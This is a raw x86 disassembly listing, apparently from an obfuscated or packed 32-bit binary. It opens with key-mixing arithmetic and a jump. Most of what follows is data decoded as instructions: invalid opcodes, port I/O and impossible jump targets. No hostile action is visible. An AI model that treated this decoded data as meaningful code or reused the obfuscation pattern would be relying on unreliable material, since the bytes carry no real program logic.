  41419f:	mov    esi,DWORD PTR [ebp+0x14]
  4141a2:	xor    DWORD PTR [eax],esi
  4141a4:	mov    eax,DWORD PTR [ebp-0x4]
  4141a7:	mov    edi,DWORD PTR [ebp+0x10]
  4141aa:	xor    edi,ecx
  4141ac:	mov    esi,0xffcd8d25
  4141b1:	mov    ebx,esi
  4141b3:	sub    ebx,edi
  4141b5:	add    DWORD PTR [eax],ebx
  4141b7:	mov    eax,DWORD PTR [ebp-0x4]
  4141ba:	mov    edi,DWORD PTR [ebp-0x8]
  4141bd:	add    edi,DWORD PTR [eax]
  4141bf:	mov    DWORD PTR [ebp-0x8],edi
  4141c2:	mov    eax,DWORD PTR [ebp+0xc]
  4141c5:	mov    edi,DWORD PTR [ebp+0xc]
  4141c8:	xor    edi,ecx
  4141ca:	xor    eax,ecx
  4141cc:	lea    eax,[eax+edi*1+0x64e5b6]
  4141d3:	mov    edi,DWORD PTR [ebp+0xc]
  4141d6:	xor    edi,ecx
  4141d8:	add    edi,edx
  4141da:	imul   eax,edi
  4141dd:	mov    edi,DWORD PTR [ebp+0xc]
  4141e0:	xor    edi,ecx
  4141e2:	sub    edi,eax
  4141e4:	mov    eax,DWORD PTR [ebp-0x4]
  4141e7:	add    edi,edx
  4141e9:	cmp    DWORD PTR [eax],edi
  4141eb:	mov    eax,DWORD PTR [ebp-0x4]
  4141ee:	mov    edi,DWORD PTR [ebp+0x10]
  4141f1:	jg     0x414204
  4141f7:	xor    edi,ecx
  4141f9:	mov    ebx,esi
  4141fb:	sub    ebx,edi
  4141fd:	add    DWORD PTR [eax],ebx
  4141ff:	jmp    0x41420a
  414204:	xor    edi,ecx
  414206:	add    edi,edx
  414208:	add    DWORD PTR [eax],edi
  41420a:	mov    eax,DWORD PTR [ebp-0x8]
  41420d:	mov    edi,DWORD PTR [ebp-0x10]
  414210:	mov    eax,DWORD PTR [eax]
  414212:	xor    edi,ecx
  414214:	add    edi,0x3272da
  41421a:	not    edi
  41421c:	and    eax,edi
  41421e:	movsx  di,BYTE PTR [eax+0x1]
  414223:	mov    ebx,0x3b4b
  414228:	sub    di,bx
  41422b:	mov    ebx,0x8a85
  414230:	xor    di,bx
  414233:	mov    ebx,0x4f8a
  414238:	cmp    di,bx
  41423b:	jmp    0x4165fa
  414240:	out    dx,al
  414241:	add    eax,0x6723a723
  414246:	outs   dx,BYTE PTR ds:[esi]
  414247:	sbb    DWORD PTR [edx+0x1b],0xf
  41424b:	hlt    
  41424c:	dec    edx
  41424d:	jmp    0x46bf36a1
  414252:	popa   
  414253:	(bad)  
  414254:	rcr    BYTE PTR [edi+0x62],0x62
  414258:	or     DWORD PTR [edx+0x266fabdd],ebp
  41425e:	prefetch (bad)
  41425f:	or     eax,0xda2887df
  414264:	jmp    0x8de8109c
  414269:	mov    dh,0xf3
  41426b:	cmc    
  41426c:	inc    eax
  41426d:	add    al,0xed
  41426f:	pushf  
  414270:	inc    ebp
  414271:	mov    fs,WORD PTR [edi+0x6cd34556]
  414277:	aaa    
  414278:	pop    esi
  414279:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41427a:	mov    edi,0x6b70455c
  41427f:	push   0xffffffef
  414281:	into   
  414282:	aam    0x70
  414284:	or     esi,DWORD PTR [esi+esi*1+0x3e360561]
  41428b:	arpl   WORD PTR [ebx],dx
  41428d:	std    
  41428e:	stos   BYTE PTR es:[edi],al
  41428f:	or     eax,DWORD PTR [ebx]
  414291:	push   esi
  414292:	mov    bl,0x9a
  414294:	push   esp
  414295:	mov    bh,al
  414297:	mov    ah,0x9b
  414299:	pusha  
  41429a:	sub    DWORD PTR [edi+edx*4+0x4],eax
  41429e:	and    eax,0x96783f17
  4142a3:	push   ecx
  4142a4:	sar    ecx,0x74
  4142a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142a8:	ins    BYTE PTR es:[edi],dx
  4142a9:	stc    
  4142aa:	jb     0x4142d5
  4142ac:	xor    bh,ch
  4142ae:	fwait
  4142af:	cdq    
  4142b0:	std    
  4142b1:	or     eax,0x120a1577
  4142b6:	ins    DWORD PTR es:[edi],dx
  4142b7:	test   BYTE PTR [esi+0x7d467638],dh
  4142bd:	pop    ds
  4142be:	cmp    al,0xaf
  4142c0:	cmp    DWORD PTR [ecx+0x4f],0xe21917a5
  4142c7:	inc    ebp
  4142c8:	test   BYTE PTR [ebp+0x67],0xa2
  4142cc:	pop    ds
  4142cd:	add    ebx,DWORD PTR [edx-0x4b]
  4142d0:	push   edx
  4142d1:	push   es
  4142d2:	ret    0x3303
  4142d5:	jl     0x41427d
  4142d7:	add    eax,0x3fc91b75
  4142dc:	sahf   
  4142dd:	ins    BYTE PTR es:[edi],dx
  4142de:	aad    0x5a
  4142e0:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142e2:	xor    esp,edx
  4142e4:	xor    DWORD PTR [si-0x1d9f],eax
  4142e9:	test   dh,dh
  4142eb:	pop    DWORD PTR [ebx+0x3d801bba]
  4142f1:	pushf  
  4142f2:	sahf   
  4142f3:	arpl   WORD PTR [esi],bx
  4142f5:	into   
  4142f6:	clc    
  4142f7:	add    DWORD PTR [edx],ecx
  4142f9:	mov    ecx,0x37e48c97
  4142fe:	push   ecx
  4142ff:	adc    al,0x67
  414301:	pusha  
  414302:	push   ds
  414303:	(bad)  
  414304:	mov    DWORD PTR [edi-0xa3cbb38],0x3c95d9ae
  41430e:	or     eax,0x7abcbc9
  414313:	and    BYTE PTR [edi],0xdf
  414316:	cmp    eax,0xbe15e9b8
  41431b:	test   eax,0x8f08a602
  414320:	xor    eax,0x7d0e79d3
  414325:	mov    ebx,0x6c96e14b
  41432a:	sub    eax,0x45f4edb0
  41432f:	or     esi,DWORD PTR [ebx+ebp*8+0x5b65f033]
  414336:	xor    DWORD PTR [ecx+0x1141d9fc],0xffffffee
  41433d:	push   ds
  41433e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41433f:	test   al,0xb3
  414341:	shl    DWORD PTR [eax+0x16],cl
  414344:	popa   
  414345:	xor    al,0x24
  414347:	xchg   edi,eax
  414348:	mov    dh,0xbd
  41434a:	popa   
  41434b:	inc    edx
  41434c:	mul    dl
  41434e:	push   ss
  41434f:	jle    0x414362
  414351:	lods   eax,DWORD PTR ds:[esi]
  414352:	pop    ss
  414353:	imul   ecx,DWORD PTR [esi-0x4fb939e3],0xffffffe3
  41435a:	aad    0x62
  41435c:	(bad)  
  41435e:	dec    esp
  41435f:	fdiv   DWORD PTR [esp+edi*2+0x4e]
  414363:	out    dx,al
  414364:	sahf   
  414365:	jle    0x41439e
  414367:	(bad)  
  414368:	(bad)  
  414369:	cmp    cl,ch
  41436b:	shl    bh,cl
  41436d:	sahf   
  41436e:	add    al,0x33
  414370:	int    0xb
  414372:	in     eax,dx
  414373:	pop    ss
  414374:	or     cl,bl
  414376:	xchg   ebp,eax
  414377:	pop    esp
  414378:	pop    ecx
  414379:	pop    eax
  41437a:	mov    esp,0xb3031fed
  41437f:	lea    ebp,[esi-0x644bd9c6]
  414385:	mov    edx,es
  414387:	loope  0x41434d
  414389:	mov    ah,0x57
  41438b:	add    al,0xad
  41438d:	or     ebx,DWORD PTR [eax]
  41438f:	cld    
  414390:	mul    BYTE PTR [esi]
  414392:	and    eax,0x18e04611
  414397:	shr    DWORD PTR [ecx],cl
  414399:	push   0x455acf9d
  41439e:	(bad)  
  41439f:	fimul  DWORD PTR [edi-0x48b0951b]
  4143a5:	int    0x83
  4143a7:	xor    eax,0xb4867491
  4143ac:	lea    edx,[eax]
  4143ae:	sbb    eax,ecx
  4143b0:	dec    eax
  4143b1:	mov    cl,0x9e
  4143b3:	inc    eax
  4143b4:	jae    0x414392
  4143b6:	mov    ebp,0x7e8236c8
  4143bb:	rol    DWORD PTR [esi+0x7],1
  4143be:	mov    ds:0xac11f5be,eax
  4143c3:	or     al,dl
  4143c5:	dec    esi
  4143c6:	gs push eax
  4143c8:	imul   ebp,DWORD PTR [ebp+0x18],0xffffff9c
  4143cc:	into   
  4143cd:	mov    bl,0x6
  4143cf:	dec    eax
  4143d0:	ret    
  4143d1:	inc    esp
  4143d2:	inc    esp
  4143d3:	or     al,0x3f
  4143d5:	or     eax,DWORD PTR [edi]
  4143d7:	push   edi
  4143d8:	popf   
  4143d9:	pop    edx
  4143da:	in     eax,dx
  4143db:	pop    ebp
  4143dc:	mov    bh,BYTE PTR [edx-0x2ff74ef8]
  4143e2:	into   
  4143e3:	(bad)  
  4143e4:	inc    BYTE PTR [ebx+0x58]
  4143e7:	mov    ?,ebx
  4143e9:	jne    0x414385
  4143eb:	retf   0xe641
  4143ee:	mov    ecx,0x995b7e23
  4143f3:	mov    ecx,DWORD PTR [edx-0x5ed9b0f9]
  4143f9:	dec    edx
  4143fa:	or     al,0x60
  4143fc:	scas   eax,DWORD PTR es:[edi]
  4143fd:	fdivr  QWORD PTR [ecx]
  4143ff:	retf   
  414400:	stos   DWORD PTR es:[edi],eax
  414401:	add    ch,BYTE PTR [eax-0x4]
  414404:	(bad)
  414407:	jecxz  0x414441
  414409:	popf   
  41440a:	sub    eax,0x47803da
  41440f:	scas   eax,DWORD PTR es:[edi]
  414410:	shr    dl,1
  414412:	out    0x4,al
  414414:	shl    esi,cl
  414416:	add    al,0xf
  414418:	mov    bl,0xad
  41441a:	mov    edx,DWORD PTR [eax]
  41441c:	outs   dx,DWORD PTR ds:[esi]
  41441d:	test   BYTE PTR [edx-0x2e],ch
  414420:	mov    dl,0xc1
  414422:	dec    esp
  414423:	sbb    al,0x79
  414425:	jo     0x4143b7
  414427:	mov    ?,WORD PTR [eax-0x60]
  41442a:	jb     0x4143d7
  41442c:	fxch   st(2)
  41442e:	mov    al,ds:0xa2192220
  414433:	sub    DWORD PTR [edi],edi
  414435:	add    ebp,DWORD PTR [esi]
  414437:	outs   dx,BYTE PTR ds:[esi]
  414438:	inc    ecx
  414439:	sbb    al,BYTE PTR [ecx]
  41443b:	jle    0x41448f
  41443d:	fdivrp st(7),st
  41443f:	mov    BYTE PTR [esi],cl
  414441:	neg    esp
  414443:	nop
  414444:	test   al,0xfb
  414446:	scas   al,BYTE PTR es:[edi]
  414447:	adc    BYTE PTR [esi],0x6b
  41444a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41444b:	sub    esp,eax
  41444d:	mov    ah,0x7c
  41444f:	mov    bh,0x3c
  414451:	shl    dl,1
  414453:	aaa    
  414454:	pop    ecx
  414455:	sub    ecx,edx
  414457:	imul   edi,DWORD PTR [eax],0x10
  41445a:	adc    ebx,esi
  41445c:	add    al,0xd4
  41445e:	fwait
  41445f:	and    BYTE PTR [ecx+0x72],bl
  414462:	out    0x76,eax
  414464:	push   esi
  414465:	mov    ebx,0x9a94aab7
  41446a:	mov    esi,0x43161e21
  41446f:	cwde   
  414470:	fdivr  DWORD PTR [ebp-0x5b]
  414473:	xchg   esp,eax
  414474:	sub    DWORD PTR [ebp+ebp*1-0x7b],esp
  414478:	push   es
  414479:	adc    DWORD PTR [edx-0x45],esp
  41447c:	imul   esp,DWORD PTR [ebx],0xffffffda
  41447f:	outs   dx,BYTE PTR ds:[esi]
  414480:	jle    0x414499
  414482:	mov    edi,0x6297667f
  414487:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414488:	ja     0x41443a
  41448a:	add    DWORD PTR [eax-0x7b25e561],0x71
  414491:	pop    eax
  414492:	cs mov ebp,0x217c8828
  414498:	mov    dh,0xca
  41449a:	sbb    ah,0x18
  41449d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41449e:	xchg   esp,eax
  41449f:	jmp    0x5b82:0xf58f07ea
  4144a6:	mov    eax,ds:0x11cbd57d
  4144ab:	add    ch,bh
  4144ad:	and    ebp,DWORD PTR [ebx]
  4144af:	sub    DWORD PTR [eax+ebp*4-0x47],edx
  4144b3:	or     ebp,DWORD PTR [esi-0x6c]
  4144b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4144b7:	ret    
  4144b8:	xchg   ecx,ebp
  4144ba:	sub    BYTE PTR [edx+0x4910186b],ah
  4144c0:	ja     0x414536
  4144c2:	pop    es
  4144c3:	mov    eax,0x41bebbe8
  4144c8:	xchg   ebx,eax
  4144c9:	cld    
  4144ca:	mov    cl,0x2c
  4144cc:	js     0x414495
  4144ce:	mov    ds:0x69e6e257,eax
  4144d3:	rcr    esp,1
  4144d5:	push   ds
  4144d6:	mov    ebp,0x260c7fbb
  4144db:	loop   0x414474
  4144dd:	xor    BYTE PTR [edx],0x97
  4144e0:	shr    bh,cl
  4144e2:	aam    0xf
  4144e4:	sub    eax,0x2993e365
  4144e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4144ea:	sub    BYTE PTR [ebp+ecx*4-0x4600679e],0x8b
  4144f2:	sbb    DWORD PTR [edx+eiz*4+0x3e89ff1f],edi
  4144f9:	iret   
  4144fa:	jne    0x4144ca
  4144fc:	dec    ebp
  4144fd:	dec    esi
  4144fe:	inc    edi
  4144ff:	inc    ebx
  414500:	outs   dx,DWORD PTR ds:[esi]
  414501:	fmul   DWORD PTR ds:0x307c39a1
  414507:	or     ebp,DWORD PTR [edi]
  414509:	add    eax,eax
  41450b:	sbb    dh,dh
  41450d:	dec    ebp
  41450e:	jmp    0xc7c2:0x11bf3d57
  414515:	pop    esi
  414516:	and    al,0x2
  414518:	and    dh,al
  41451a:	sub    al,0xde
  41451c:	xchg   ebp,eax
  41451d:	cmp    edx,0xbda7d459
  414523:	mov    ecx,0x68286ed9
  414528:	cs out 0x6f,al
  41452b:	add    edx,DWORD PTR [edi+0x56]
  41452e:	pushf  
  41452f:	repnz and ah,BYTE PTR [ebx+ebx*1+0x3c13c221]
  414537:	jb     0x4144e9
  414539:	std    
  41453a:	push   esi
  41453b:	call   0xb313:0x9603eeec
  414542:	cmp    BYTE PTR [ebp-0x6a],bl
  414545:	mov    ebx,0x8bc8f288
  41454a:	lods   eax,DWORD PTR ds:[esi]
  41454b:	inc    edx
  41454c:	out    dx,al
  41454d:	inc    ecx
  41454e:	jno    0x4145bd
  414550:	inc    ebp
  414551:	cmp    ch,BYTE PTR [ecx]
  414553:	cmp    BYTE PTR [ebp+0x7962f2cf],ch
  414559:	hlt    
  41455a:	call   0xde7c4428
  41455f:	dec    esi
  414560:	daa    
  414561:	aad    0x65
  414563:	sbb    al,0x77
  414565:	and    bh,BYTE PTR [ebp-0x4c]
  414568:	(bad)  
  414569:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41456a:	add    ecx,ecx
  41456c:	jecxz  0x41453f
  41456e:	popa   
  41456f:	das    
  414570:	sub    al,0x1c
  414572:	fwait
  414573:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414574:	mov    bh,0x2a
  414576:	mov    ebx,0x4001aae8
  41457b:	mov    ah,0xfb
  41457d:	icebp  
  41457e:	inc    ecx
  41457f:	jae    0x414501
  414581:	inc    eax
  414582:	mov    DWORD PTR [esi+0x46],edx
  414585:	jl     0x414556
  414587:	add    BYTE PTR [edx+0x57260585],dl
  41458d:	push   cs
  41458e:	pop    ecx
  41458f:	mov    dh,0x73
  414591:	mov    edi,0xf3f0cef9
  414596:	push   esi
  414597:	sbb    esp,DWORD PTR [ecx]
  414599:	pop    ecx
  41459a:	xor    DWORD PTR [edx-0x4c772771],eax
  4145a0:	mov    ecx,0xcef607c2
  4145a5:	ja     0x414576
  4145a7:	test   edi,esi
  4145a9:	push   cs
  4145aa:	pushf  
  4145ab:	push   edx
  4145ac:	jecxz  0x4145d9
  4145ae:	aam    0x30
  4145b0:	xchg   ebx,eax
  4145b1:	mov    bh,0x37
  4145b3:	pop    ds
  4145b4:	sti    
  4145b5:	mov    eax,ds:0xaed3e0bd
  4145ba:	jbe    0x15fb34e2
  4145c0:	mov    dl,dl
  4145c2:	fstp   QWORD PTR [esi+eiz*8]
  4145c5:	sub    eax,DWORD PTR [edx+esi*8+0x25]
  4145c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145ca:	rcl    DWORD PTR [edi+0x2e],cl
  4145cd:	stc    
  4145ce:	loope  0x414597
  4145d0:	sub    bh,ah
  4145d2:	xchg   BYTE PTR [esi+0x74707c5],bh
  4145d8:	dec    ebp
  4145d9:	sahf   
  4145da:	aaa    
  4145db:	jg     0x414595
  4145dd:	lock or ebx,DWORD PTR [ebx]
  4145e0:	retf   
  4145e1:	ret    0x623e
  4145e4:	cli    
  4145e5:	mov    ch,bl
  4145e7:	cmc    
  4145e8:	mov    eax,0xf9f9e683
  4145ed:	jmp    0x414579
  4145ef:	lea    ebp,[edx]
  4145f1:	imul   edi,DWORD PTR [ebp+0x7a0e84a2],0xa8c04ffa
  4145fb:	cmp    bh,ah
  4145fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145fe:	cwde   
  4145ff:	inc    edx
  414600:	test   DWORD PTR [esi],edx
  414602:	pop    eax
  414603:	cmp    cl,cl
  414605:	jle    0x41462d
  414607:	mov    ecx,0xeec6d89d
  41460c:	fs push edx
  41460e:	jle    0x414596
  414610:	cmp    BYTE PTR [eax-0x30f92be3],dh
  414616:	inc    edx
  414617:	in     al,0xa4
  414619:	push   cs
  41461a:	xor    al,0x7
  41461c:	push   edx
  41461d:	das    
  41461e:	lahf   
  41461f:	test   eax,0xd7f348bc
  414624:	leave  
  414625:	fst    DWORD PTR [edx]
  414627:	fdiv   QWORD PTR [eax+0x54]
  41462a:	ss icebp 
  41462c:	jg     0x4145bc
  41462e:	ret    0x8808
  414631:	sub    ebp,DWORD PTR [edi]
  414633:	jg     0x4146b2
  414635:	jecxz  0x4145c8
  414637:	inc    eax
  414638:	test   DWORD PTR [ebx],edx
  41463a:	fldenv [edx+0x69]
  41463d:	imul   ebx,DWORD PTR [edx],0x1b
  414640:	inc    ebp
  414641:	mov    dl,0xef
  414643:	cli    
  414644:	cmp    esi,esp
  414646:	ja     0x4145e4
  414648:	pop    eax
  414649:	dec    esp
  41464a:	mov    bh,0xe
  41464c:	sbb    DWORD PTR [ebx-0x3b8b2bcc],ecx
  414652:	inc    ebp
  414653:	ds pop edx
  414655:	pop    ss
  414656:	or     eax,eax
  414658:	dec    edx
  414659:	stos   BYTE PTR es:[edi],al
  41465a:	jp     0x41461d
  41465c:	pop    edi
  41465d:	xor    BYTE PTR [eax],0xcb
  414660:	hlt    
  414661:	daa    
  414662:	and    ebx,DWORD PTR [edi]
  414664:	push   es
  414665:	sub    BYTE PTR [eax+0x41],ch
  414668:	outs   dx,DWORD PTR ds:[esi]
  414669:	(bad)  
  41466a:	xor    eax,ebp
  41466c:	jp     0x414658
  41466e:	aam    0x9e
  414670:	mov    esp,0x9c772653
  414675:	mov    al,0xf0
  414677:	enter  0x37f6,0x62
  41467b:	cwde   
  41467c:	test   eax,0x662f9759
  414681:	inc    ebp
  414682:	cs add ecx,ecx
  414685:	mov    ch,BYTE PTR [ebx+eiz*1]
  414688:	dec    ecx
  414689:	dec    ebx
  41468a:	push   esp
  41468b:	mov    dl,0x18
  41468d:	jb     0x41461a
  41468f:	fs inc esi
  414691:	cmp    al,BYTE PTR [esi+0x3ad702de]
  414697:	pop    eax
  414698:	or     DWORD PTR [ebx],0xffffffc4
  41469b:	xchg   ecx,eax
  41469c:	sub    DWORD PTR [ebx+0x5c986792],ecx
  4146a2:	lods   al,BYTE PTR ds:[esi]
  4146a3:	add    ecx,edx
  4146a5:	mov    dh,0xaa
  4146a7:	cli    
  4146a8:	lock dec edx
  4146aa:	imul   eax,eax,0x69
  4146ad:	fiadd  WORD PTR [edi]
  4146af:	scas   al,BYTE PTR es:[edi]
  4146b0:	in     al,dx
  4146b1:	sbb    al,bl
  4146b3:	mov    BYTE PTR [esp+edx*8-0x5a],dl
  4146b7:	clc    
  4146b8:	pop    ds
  4146b9:	mov    al,0xcd
  4146bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4146bc:	add    al,0x3f
  4146be:	dec    ebp
  4146bf:	sub    al,0x42
  4146c1:	push   esp
  4146c2:	imul   ecx
  4146c4:	lods   eax,DWORD PTR ds:[esi]
  4146c5:	or     bh,bl
  4146c7:	mov    al,ds:0xee8d663
  4146cc:	cmc    
  4146cd:	dec    edx
  4146ce:	adc    bl,0x22
  4146d1:	jl     0x41472b
  4146d3:	repnz call 0xd5e8:0xe514d73c
  4146db:	or     dl,al
  4146dd:	xor    dh,BYTE PTR [edi+0x54]
  4146e0:	stos   BYTE PTR es:[edi],al
  4146e1:	add    eax,0xc620f448
  4146e6:	daa    
  4146e7:	xchg   ebp,eax
  4146e8:	mov    ah,0x18
  4146ea:	test   eax,0x53e5a82f
  4146ef:	outs   dx,DWORD PTR ds:[esi]
  4146f0:	inc    ebp
  4146f1:	xchg   esi,eax
  4146f2:	mov    esp,0x4fa503d0
  4146f7:	jae    0x414708
  4146f9:	or     edi,esp
  4146fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4146fc:	pop    esp
  4146fd:	cs sub al,0x13
  414700:	test   DWORD PTR [edi],edx
  414702:	jbe    0x414768
  414704:	xchg   esi,eax
  414705:	mov    ds:0x81ede5c3,al
  41470a:	out    0x2d,al
  41470c:	out    0xc,eax
  41470e:	mov    ?,WORD PTR [edx+edi*4]
  414711:	or     BYTE PTR [ecx+0x5e],al
  414714:	push   edx
  414715:	mov    esi,0x33cb7d1e
  41471a:	mov    DWORD PTR [ebx+eax*1-0x4477b78f],ebx
  414721:	(bad)  
  414723:	sub    ch,cl
  414725:	add    esp,DWORD PTR [ebx+0x33898a84]
  41472b:	adc    al,0xcd
  41472d:	ret    
  41472e:	aaa    
  41472f:	push   ebx
  414730:	sub    dl,BYTE PTR [edx+eiz*4]
  414733:	inc    ebp
  414734:	mov    bh,0x1e
  414736:	or     DWORD PTR [edx+ecx*2],edi
  414739:	adc    cl,BYTE PTR [edi-0x42a7fa42]
  41473f:	icebp  
  414740:	ja     0x4146e5
  414742:	out    dx,al
  414743:	leave  
  414744:	pop    eax
  414745:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414746:	fild   WORD PTR [ebx+ebx*1-0x32]
  41474a:	add    eax,0x54a95aff
  41474f:	and    BYTE PTR [edx+edx*1-0x7d],cl
  414753:	cs push cs
  414755:	push   edi
  414756:	sbb    DWORD PTR [ebx+eax*4-0x31],esi
  41475a:	mov    dh,0x95
  41475c:	ret    
  41475d:	call   0x90ab:0x88839571
  414764:	je     0x4147b4
  414766:	fld    TBYTE PTR [ecx+edi*2]
  414769:	(bad)  
  41476a:	jnp    0x41476d
  41476c:	ds pop ds
  41476e:	aaa    
  41476f:	add    edi,DWORD PTR [edi]
  414771:	sub    BYTE PTR [ebx-0xb],dh
  414774:	mov    al,ds:0x8125b2e6
  414779:	xor    edx,esp
  41477b:	sbb    al,0xcc
  41477d:	or     ebx,esp
  41477f:	(bad)  
  414780:	cmp    DWORD PTR [ecx+eiz*8+0x5d],esi
  414784:	pop    ecx
  414785:	popf   
  414786:	fidiv  DWORD PTR [ecx-0x62]
  414789:	(bad)  
  41478a:	xchg   esi,eax
  41478b:	xor    al,BYTE PTR [ecx]
  41478d:	fild   QWORD PTR [ecx]
  41478f:	je     0x414723
  414791:	test   BYTE PTR [esi+0x6f695c3d],dh
  414797:	mov    edx,0xe8f8f048
  41479c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41479d:	test   BYTE PTR [ecx+0x413b88ee],al
  4147a3:	adc    al,0x1a
  4147a5:	jmp    0xdb4e92f
  4147aa:	push   eax
  4147ab:	add    al,0xf9
  4147ad:	jns    0x4147cf
  4147af:	cmc    
  4147b0:	lds    ecx,FWORD PTR [edi-0x1a8ced6a]
  4147b6:	and    BYTE PTR [esi+0x69],dl
  4147b9:	js     0x4147f8
  4147bb:	cwde   
  4147bc:	pop    ebx
  4147bd:	sbb    dh,BYTE PTR [edx-0x65]
  4147c0:	mov    dl,BYTE PTR es:[eax-0x327ae3ef]
  4147c7:	les    ebp,FWORD PTR [ebp+0x36]
  4147ca:	jge    0x414826
  4147cc:	scas   al,BYTE PTR es:[edi]
  4147cd:	arpl   WORD PTR [edx-0x482a5937],sp
  4147d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147d4:	(bad)  
  4147d5:	mov    ds:0xcdc1739d,eax
  4147da:	scas   al,BYTE PTR es:[edi]
  4147db:	mov    ah,0xe3
  4147dd:	mov    ch,BYTE PTR [edx+0x6]
  4147e0:	in     al,0x3d
  4147e2:	and    BYTE PTR [eax-0x7097d64],ch
  4147e8:	cli    
  4147e9:	push   esp
  4147ea:	lock popf 
  4147ec:	into   
  4147ed:	jno    0x41484d
  4147ef:	adc    edx,DWORD PTR [ebx+0x57e685b4]
  4147f5:	xor    al,0xf8
  4147f7:	adc    al,0xa4
  4147f9:	in     eax,0xfb
  4147fb:	test   DWORD PTR [edx+ebx*4],0xdbd01837
  414802:	dec    edi
  414803:	push   cs
  414804:	adc    DWORD PTR [edi+0x18],edx
  414807:	mov    bh,0xde
  414809:	xor    DWORD PTR [ecx+esi*4+0x5249ecea],esi
  414810:	loopne 0x4147de
  414812:	cmp    esp,DWORD PTR [ebp-0x19533158]
  414818:	mov    BYTE PTR [esi+0x3d53bc41],ch
  41481e:	xor    DWORD PTR [ebp-0x15a4fc0c],ebp
  414824:	dec    edi
  414825:	add    DWORD PTR ds:[ebx+0x494ee52b],ecx
  41482c:	mov    cl,0x18
  41482e:	nop
  41482f:	inc    esp
  414830:	jo     0x414837
  414832:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414833:	stc    
  414834:	sbb    eax,DWORD PTR [edi+0xe]
  414837:	inc    edx
  414838:	adc    dh,BYTE PTR [ebp-0x7413578c]
  41483e:	push   ecx
  41483f:	inc    edx
  414840:	push   esp
  414841:	pop    ebx
  414842:	clc    
  414843:	loop   0x414801
  414845:	jno    0x4147f6
  414847:	push   cs
  414848:	push   cs
  414849:	mov    ah,0x5b
  41484b:	mov    dh,bh
  41484d:	adc    bl,BYTE PTR [edx]
  41484f:	mov    ebx,0xdff2e24b
  414854:	sbb    ch,bh
  414856:	(bad)  
  414857:	mul    DWORD PTR [ecx+0x2f8036bf]
  41485d:	mov    ds:0x9a29b3a0,eax
  414862:	mov    DWORD PTR [ecx-0x27],edx
  414865:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414866:	mov    ah,0x49
  414868:	pushf  
  414869:	fimul  WORD PTR [edx+0x78]
  41486c:	cmp    edi,edi
  41486e:	or     eax,0xcf663f8e
  414873:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414874:	or     esi,DWORD PTR [esp+edx*8+0x40]
  414878:	fs loope 0x414839
  41487b:	mov    eax,0xa85a5ca1
  414880:	jnp    0x414836
  414882:	arpl   WORD PTR [edi],si
  414884:	xor    BYTE PTR [eax+0x40],al
  414887:	sbb    al,0xda
  414889:	cld    
  41488a:	push   0xa
  41488c:	out    dx,eax
  41488d:	ja     0x414894
  41488f:	les    ebp,FWORD PTR [esp+edi*2+0x14d0646e]
  414896:	loopne 0x414838
  414898:	out    dx,eax
  414899:	cmp    DWORD PTR [ecx],ebp
  41489b:	pop    ecx
  41489c:	inc    edi
  41489d:	mov    ecx,0xdd2a8407
  4148a2:	xor    eax,0xb9ee087c
  4148a7:	xor    BYTE PTR [ecx+esi*2],0x8f
  4148ab:	jo     0x414848
  4148ad:	cmp    eax,0x9245fc9
  4148b2:	ret    0x3e7c
  4148b5:	ss std 
  4148b7:	and    DWORD PTR [eax+0x14],ebp
  4148ba:	adc    BYTE PTR [ecx+ebx*1+0x4036e7f6],bh
  4148c1:	jno    0x4148fe
  4148c3:	sbb    al,0x4f
  4148c5:	dec    edi
  4148c6:	scas   al,BYTE PTR es:[edi]
  4148c7:	sbb    eax,0xffffffee
  4148ca:	ja     0x414904
  4148cc:	stos   DWORD PTR es:[edi],eax
  4148cd:	sub    eax,0x63dbad15
  4148d2:	pop    eax
  4148d3:	mov    eax,0xc6a17fd0
  4148d8:	arpl   WORD PTR [edi+edx*4+0xd],sp
  4148dc:	fidiv  DWORD PTR [esi]
  4148de:	mov    al,ds:0x455eb781
  4148e3:	pop    edx
  4148e4:	inc    esp
  4148e5:	and    ch,ch
  4148e7:	push   edi
  4148e8:	lahf   
  4148e9:	pop    esi
  4148ea:	sahf   
  4148eb:	jmp    0x414961
  4148ed:	je     0x4148a9
  4148ef:	add    al,0x7d
  4148f1:	repz not cl
  4148f4:	mov    DWORD PTR [edi+0x12],esp
  4148f7:	sar    ch,1
  4148f9:	pusha  
  4148fa:	jecxz  0x4148ef
  4148fc:	ret    0xf671
  4148ff:	out    0x94,eax
  414901:	cmp    eax,0x78f2118b
  414906:	add    BYTE PTR [eax+0xed69478],0xc2
  41490d:	mov    ch,0x5b
  41490f:	fst    DWORD PTR [ebx]
  414911:	ret    0x3177
  414914:	sbb    DWORD PTR [edi+0x296ae151],eax
  41491a:	retf   0x695b
  41491d:	jae    0x4148ed
  41491f:	shl    BYTE PTR [ebx-0x10f56a38],cl
  414925:	loope  0x414927
  414927:	fnstsw WORD PTR [esi+0x311b70ba]
  41492d:	inc    esp
  41492e:	daa    
  41492f:	mov    ds:0xe66e77e5,al
  414934:	lahf   
  414935:	inc    esi
  414936:	hlt    
  414937:	arpl   WORD PTR [eax],bp
  414939:	out    dx,al
  41493a:	jecxz  0x414985
  41493c:	sbb    DWORD PTR [ecx],esi
  41493e:	sbb    al,0xb
  414940:	addr16 cmc 
  414942:	lods   eax,DWORD PTR ds:[esi]
  414943:	ja     0x41499b
